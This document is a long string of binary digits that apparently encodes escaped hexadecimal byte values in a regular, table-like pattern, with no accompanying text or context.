000101011100011110000011000100110111011001000101110001111000001100000011001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000000110011010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001011001010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000001100000011010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000000110101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110000001101100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100000011011101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000000111000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100110001100010101110001111000001100000011000001011100011110000011000100110111011001000101110001110100010111000111100000110000001100010101110001111000001100010011011101100100010111000110111001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000001100010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110000011000110101110001111000001100000011000101011100011110000011000100110111011001000101110001110010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110000011001010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100000110011001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000100110000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001100010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010011001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000100110011010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001101000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010011010101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000100110110010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001101110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010011100001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000100111001010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001011000010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010110001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000101100011010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001011001000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010110010101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000101100110010111000111100000110000001100010101110001111000001100010011011101100100001000000101110001111000001100000011000101011100011110000011000100110111011001000010000101011100011110000011000000110001010111000111100000110001001101110110010000100010010111000111100000110000001100010101110001111000001100010011011101100100001000110101110001111000001100000011000101011100011110000011000100110111011001000010010001011100011110000011000000110001010111000111100000110001001101110110010000100101010111000111100000110000001100010101110001111000001100010011011101100100001001100101110001111000001100000011000101011100011110000011000100110111011001000101110000100111010111000111100000110000001100010101110001111000001100010011011101100100001010000101110001111000001100000011000101011100011110000011000100110111011001000010100101011100011110000011000000110001010111000111100000110001001101110110010000101010010111000111100000110000001100010101110001111000001100010011011101100100001010110101110001111000001100000011000101011100011110000011000100110111011001000010110001011100011110000011000000110001010111000111100000110001001101110110010000101101010111000111100000110000001100010101110001111000001100010011011101100100001011100101110001111000001100000011000101011100011110000011000100110111011001000010111101011100011110000011000000110001010111000111100000110001001101110110010000110000010111000111100000110000001100010101110001111000001100010011011101100100001100010101110001111000001100000011000101011100011110000011000100110111011001000011001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000101100100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001011001010101110001111000001100000011000101011100011110000011000100110111011001000011001101011100011110000011000000110001010111000111100000110001001101110110010000110100010111000111100000110000001100010101110001111000001100010011011101100100001101010101110001111000001100000011000101011100011110000011000100110111011001000011011001011100011110000011000000110001010111000111100000110001001101110110010000110111010111000111100000110000001100010101110001111000001100010011011101100100001110000101110001111000001100000011000101011100011110000011000100110111011001000011100101011100011110000011000000110001010111000111100000110001001101110110010000111010010111000111100000110000001100010101110001111000001100010011011101100100001110110101110001111000001100000011000101011100011110000011000100110111011001000011110001011100011110000011000000110001010111000111100000110001001101110110010000111101010111000111100000110000001100010101110001111000001100010011011101100100001111100101110001111000001100000011000101011100011110000011000100110111011001000011111101011100011110000011000000110001010111000111100000110001001101110110010001000000010111000111100000110000001100010101110001111000001100010011011101100100010000010101110001111000001100000011000101011100011110000011000100110111011001000100001001011100011110000011000000110001010111000111100000110001001101110110010001000011010111000111100000110000001100010101110001111000001100010011011101100100010001000101110001111000001100000011000101011100011110000011000100110111011001000100010101011100011110000011000000110001010111000111100000110001001101110110010000110100010111000111100000110000001100010101110001111000001100010011011101100100001101010101110001111000001100000011000101011100011110000011000100110111011001000100011001011100011110000011000000110001010111000111100000110001001101110110010001000111010111000111100000110000001100010101110001111000001100010011011101100100010010000101110001111000001100000011000101011100011110000011000100110111011001000100100101011100011110000011000000110001010111000111100000110001001101110110010001001010010111000111100000110000001100010101110001111000001100010011011101100100001001000101110001111000001100000011000101011100011110000011000100110111011001000100101101011100011110000011000000110001010111000111100000110001001101110110010001001100010111000111100000110000001100010101110001111000001100010011011101100100010011010101110001111000001100000011000101011100011110000011000100110111011001000100111001011100011110000011000000110001010111000111100000110001001101110110010001001111010111000111100000110000001100010101110001111000001100010011011101100100010100000101110001111000001100000011000101011100011110000011000100110111011001000101000101011100011110000011000000110001010111000111100000110001001101110110010001010010010111000111100000110000001100010101110001111000001100010011011101100100010100110101110001111000001100000011000101011100011110000011000100110111011001000101010001011100011110000011000000110001010111000111100000110001001101110110010001010101010111000111100000110000001100010101110001111000001100010011011101100100010101100101110001111000001100000011000101011100011110000011000100110111011001000101011101011100011110000011000000110001010111000111100000110001001101110110010001011000010111000111100000110000001100010101110001111000001100010011011101100100010110010101110001111000001100000011000101011100011110000011000100110111011001000101101001011100011110000011000000110001010111000111100000110001001101110110010001000010010111000111100000110000001100010101110001111000001100010011011101100100010110110101110001111000001100000011000101011100011110000011000100110111011001000101110001011100010111000111100000110000001100010101110001111000001100010011011101100100010111010101110001111000001100000011000101011100011110000011000100110111011001000101111001011100011110000011000000110001010111000111100000110001001101110110010001011111010111000111100000110000001100010101110001111000001100010011011101100100011000000101110001111000001100000011000101011100011110000011000100110111011001000110000101011100011110000011000000110001010111000111100000110001001101110110010001100010010111000111100000110000001100010101110001111000001100010011011101100100011000110101110001111000001100000011000101011100011110000011000100110111011001000110010001011100011110000011000000110001010111000111100000110001001101110110010001100101010111000111100000110000001100010101110001111000001100010011011101100100011001100101110001111000001100000011000101011100011110000011000100110111011001000110011101011100011110000011000000110001010111000111100000110001001101110110010001101000010111000111100000110000001100010101110001111000001100010011011101100100011010010101110001111000001100000011000101011100011110000011000100110111011001000110101001011100011110000011000000110001010111000111100000110001001101110110010001101011010111000111100000110000001100010101110001111000001100010011011101100100011011000101110001111000001100000011000101011100011110000011000100110111011001000110110101011100011110000011000000110001010111000111100000110001001101110110010001101110010111000111100000110000001100010101110001111000001100010011011101100100011011110101110001111000001100000011000101011100011110000011000100110111011001000111000001011100011110000011000000110001010111000111100000110001001101110110010001110001010111000111100000110000001100010101110001111000001100010011011101100100011100100101110001111000001100000011000101011100011110000011000100110111011001000111001101011100011110000011000000110001010111000111100000110001001101110110010001110100010111000111100000110000001100010101110001111000001100010011011101100100011101010101110001111000001100000011000101011100011110000011000100110111011001000111011001011100011110000011000000110001010111000111100000110001001101110110010001110111010111000111100000110000001100010101110001111000001100010011011101100100011110000101110001111000001100000011000101011100011110000011000100110111011001000111100101011100011110000011000000110001010111000111100000110001001101110110010001111010010111000111100000110000001100010101110001111000001100010011011101100100011110110101110001111000001100000011000101011100011110000011000100110111011001000111110001011100011110000011000000110001010111000111100000110001001101110110010001111101010111000111100000110000001100010101110001111000001100010011011101100100011111100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001100110010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011011101100110010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000001100000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000011000101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100000110010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000001100110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100000110101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000001101100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000011011101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000001110010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000110000101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100001100010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000011000110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000110010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100001100101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111000011001100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110010011000001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100100110001010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111001001100100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110010011001101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100100110100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111001001101010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110010011011001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100100110111010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111001001110000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110010011100101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100101100001010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111001011000100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110010110001101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100101100100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000111001011001010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110010110011001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110000100110000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100001001100010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010110000101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110000100110010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100001001100110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000010011010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110000100110101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100001001101100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000010011011101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110000100111000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100001001110010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000010110000101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110000101100010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100001011000110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000010110010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110000101100101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100001011001100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100000011011101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001000110000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100010001100010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100011001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001000110011010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100010001101000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100011010101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001000110110010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100010001101110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100011100001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001000111001010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100010011000010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100110001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001001100011010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001110010101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011000100110010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001001100101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100010011001100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000010110010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110000101100101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100011001100000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100000011011101011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110001000110000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100010001100010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100011001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001000110011010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100010001101000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000100011010101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001000110110010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100010001101110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000110011000101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001100110010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100011001100110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000110011010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001100110101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100011001101100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000110011011101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001100111000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100011001110010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000110110000101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001101100010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100011011000110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011000110110010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110001101100101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100011011001100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001000011000001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010000110001010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100100001100100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001000011001101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010000110100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100100001101010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001000011011001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010000110111010111000111100000110000001100010101110001111000001100010011011101100100010111110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010000111000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100100001110010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001000110000101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010001100010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100100011000110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001000110010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010001100010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100100011001010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110010001100110010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100101001100000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001010011000101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010100110010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100101001100110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001010011010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010100110101010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100101001101100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001010011011101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010000110001010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100101001110000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001010011100101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010101100001010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100101011000100101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001010110001101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110010101100100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100101011001010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001010110011001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110011000110000010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100110001100010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001100011001001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110011000110011010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100110001101000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001100011010101011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110011000110110010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100110001101110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001100011100001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000110011000111001010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100110011000010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001100110001001011100011110000011000000110001010111000111100000110001001101110110010001001110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110011000110101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001100110010001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011100001100010010111000111100000110000001100010101110001111000001100010011011101100100010111000111100001100110011001010101110001111000001100000011000101011100011110000011000100110111011001000101110001111000011001100110011001011100011110000011000000110001010111000111100000110001001101110110010001011100011110000011000000110000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110000001100010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100000011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011000000110011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110000001101000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100000011010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011000000110110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110000001101110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100000011100001011100011110000011000000110010010111000111100000110001001101110110010001011100011101000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011010001011100011110000011000000110000010111000111100000110001001101110110010001011100011011100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011011100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100000110001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011000001100110010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110000011000110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100000011010101011100011110000011000000110010010111000111100000110001001101110110010001011100011100100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100000110010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011000001100110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110001001100000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100010011000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011000100110010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110001001100110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100010011010001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011000100110101010111000111100000110000001100100101110001111000001100010011011101100100001001000101110001111000001100000011000101011100011110000011000100110111011001000101110001111000001100010011011001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000110001001101110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100010011100001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110011000110100010111000111100000110000001100010101110001111000001100010011011101100100010111000111100000110001001110010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100010110000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011000101100010010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110001011000110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011000101100100010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110001011001010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001100010110011001011100011110000011000000110010010111000111100000110001001101110110010000100000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110001011001010101110001111000001100000011001001011100011110000011000100110111011001000010000101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110100010111000111100000110000001100000101110001111000001100010011011101100100001000100101110001111000001100000011001001011100011110000011000100110111011001000010001101011100011110000011000000110010010111000111100000110001001101110110010000100100010111000111100000110000001100100101110001111000001100010011011101100100001001010101110001111000001100000011001001011100011110000011000100110111011001000010011001011100011110000011000000110010010111000111100000110001001101110110010001011100001001110101110001111000001100000011001001011100011110000011000100110111011001000100111101011100011110000011000000110001010111000111100000110001001101110110010000101000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001101110101110001111000001100000011000101011100011110000011000100110111011001000010100101011100011110000011000000110010010111000111100000110001001101110110010000101010010111000111100000110000001100100101110001111000001100010011011101100100001010110101110001111000001100000011001001011100011110000011000100110111011001000010110001011100011110000011000000110010010111000111100000110001001101110110010000101101010111000111100000110000001100100101110001111000001100010011011101100100001011100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011001000011000101011100011110000011000000110001010111000111100000110001001101110110010000101111010111000111100000110000001100100101110001111000001100010011011101100100001100000101110001111000001100000011001001011100011110000011000100110111011001000011000101011100011110000011000000110010010111000111100000110001001101110110010000110010010111000111100000110000001100100101110001111000001100010011011101100100001100110101110001111000001100000011001001011100011110000011000100110111011001000110111001011100011110000011000000110001010111000111100000110001001101110110010000110100010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011000001011100011110000011000100110111011001000011010101011100011110000011000000110010010111000111100000110001001101110110010000110110010111000111100000110000001100100101110001111000001100010011011101100100001101110101110001111000001100000011001001011100011110000011000100110111011001000011100001011100011110000011000000110010010111000111100000110001001101110110010000111001010111000111100000110000001100100101110001111000001100010011011101100100001110100101110001111000001100000011001001011100011110000011000100110111011001000011101101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100001111000101110001111000001100000011001001011100011110000011000100110111011001000011110101011100011110000011000000110010010111000111100000110001001101110110010000111110010111000111100000110000001100100101110001111000001100010011011101100100001111110101110001111000001100000011001001011100011110000011000100110111011001000100000001011100011110000011000000110010010111000111100000110001001101110110010001001011010111000111100000110000001100010101110001111000001100010011011101100100010000010101110001111000001100000011001001011100011110000011000100110111011001000100001001011100011110000011000000110010010111000111100000110001001101110110010001000011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000100010001011100011110000011000000110010010111000111100000110001001101110110010001000101010111000111100000110000001100100101110001111000001100010011011101100100010001100101110001111000001100000011001001011100011110000011000100110111011001000100011101011100011110000011000000110010010111000111100000110001001101110110010001001000010111000111100000110000001100100101110001111000001100010011011101100100010010010101110001111000001100000011001001011100011110000011000100110111011001000100101001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000110010101100100010111000111100000110000001100010101110001111000001100010011011101100100010010110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000110011000110000010111000111100000110000001100010101110001111000001100010011011101100100010011000101110001111000001100000011001001011100011110000011000100110111011001000100110101011100011110000011000000110010010111000111100000110001001101110110010001001110010111000111100000110000001100100101110001111000001100010011011101100100010011110101110001111000001100000011001001011100011110000011000100110111011001000101000001011100011110000011000000110010010111000111100000110001001101110110010001010001010111000111100000110000001100100101110001111000001100010011011101100100010100100101110001111000001100000011001001011100011110000011000100110111011001000101001101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010001000101110001111000001100000011001001011100011110000011000100110111011001000100010101011100011110000011000000110010010111000111100000110001001101110110010001010100010111000111100000110000001100100101110001111000001100010011011101100100010101010101110001111000001100000011001001011100011110000011000100110111011001000101011001011100011110000011000000110010010111000111100000110001001101110110010001010111010111000111100000110000001100100101110001111000001100010011011101100100010110000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010000100101010111000111100000110000001100100101110001111000001100010011011101100100001001100101110001111000001100000011001001011100011110000011000100110111011001000101110000100111010111000111100000110000001100100101110001111000001100010011011101100100010110010101110001111000001100000011001001011100011110000011000100110111011001000101101001011100011110000011000000110010010111000111100000110001001101110110010001011011010111000111100000110000001100100101110001111000001100010011011101100100010111000101110001011100011110000011000000110010010111000111100000110001001101110110010001011101010111000111100000110000001100100101110001111000001100010011011101100100010111100101110001111000001100000011001001011100011110000011000100110111011001000101111101011100011110000011000000110010010111000111100000110001001101110110010001100000010111000111100000110000001100100101110001111000001100010011011101100100011000010101110001111000001100000011001001011100011110000011000100110111011001000110100101011100011110000011000000110001010111000111100000110001001101110110010001100010010111000111100000110000001100100101110001111000001100010011011101100100011000110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001100100010111000111100000110000001100100101110001111000001100010011011101100100001100100101110001111000001100000011000101011100011110000011000100110111011001000110010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100001100110001100000101110001111000001100000011000101011100011110000011000100110111011001000100110001011100011110000011000000110010010111000111100000110001001101110110010001001101010111000111100000110000001100100101110001111000001100010011011101100100010011100101110001111000001100000011001001011100011110000011000100110111011001000110011001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100011001110101110001111000001100000011001001011100011110000011000100110111011001000101001001011100011110000011000000110000010111000111100000110001001101110110010001101000010111000111100000110000001100100101110001111000001100010011011101100100011010010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110000010111000111100000110001001101110110010001101010010111000111100000110000001100100101110001111000001100010011011101100100011010110101110001111000001100000011001001011100011110000011000100110111011001000110110001011100011110000011000000110010010111000111100000110001001101110110010001101101010111000111100000110000001100100101110001111000001100010011011101100100011011100101110001111000001100000011001001011100011110000011000100110111011001000110111101011100011110000011000000110010010111000111100000110001001101110110010001110000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000111000101011100011110000011000000110010010111000111100000110001001101110110010001110010010111000111100000110000001100100101110001111000001100010011011101100100011100110101110001111000001100000011001001011100011110000011000100110111011001000111010001011100011110000011000000110010010111000111100000110001001101110110010001110101010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000101110001111000011001010110001101011100011110000011000000110000010111000111100000110001001101110110010001110110010111000111100000110000001100100101110001111000001100010011011101100100011000100101110001111000001100000011001001011100011110000011000100110111011001000111011101011100011110000011000000110010010111000111100000110001001101110110010001111000010111000111100000110000001100100101110001111000001100010011011101100100011110010101110001111000001100000011001001011100011110000011000100110111011001000111101001011100011110000011000000110010010111000111100000110001001101110110010001111011010111000111100000110000001100100101110001111000001100010011011101100100011111000101110001111000001100000011001001011100011110000011000100110111011001000011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010001000101110001111000001100000011001001011100011110000011000100110111011001000111110101011100011110000011000000110010010111000111100000110001001101110110010001111110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000110111011001100101110001111000001100000011001001011100011110000011000100110111011001000101110001111000011000010011000001011100011110000011000000110000010111000111100000110001001101110110010001011100011110000011100000110000010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001100010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001110000101110001111000001100000011000001011100011110000011000100110111011001000011010101011100011110000011000000110010010111000111100000110001001101110110010000110110010111000111100000110000001100100101110001111000001100010011011101100100001101110101110001111000001100000011001001011100011110000011000100110111011001000011100001011100011110000011000000110010010111000111100000110001001101110110010000111001010111000111100000110000001100100101110001111000001100010011011101100100001110100101110001111000001100000011001001011100011110000011000100110111011001000011101101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111000010111000111100000110000001100000101110001111000001100010011011101100100010111000111100000111000001101000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011010101011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000110110010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000001101110101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000011100001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100000111001010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000011000010101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000110001001011100011110000011000000110010010111000111100000110001001101110110010001011100011110000011100001100011010111000111100000110000001100100101110001111000001100010011011101100100010111000111100000111000011001000101110001111000001100000011001001011100011110000011000100110111011001000101110001111000001110000110010101011100011110000011000000110010010111000111100000110001001101110110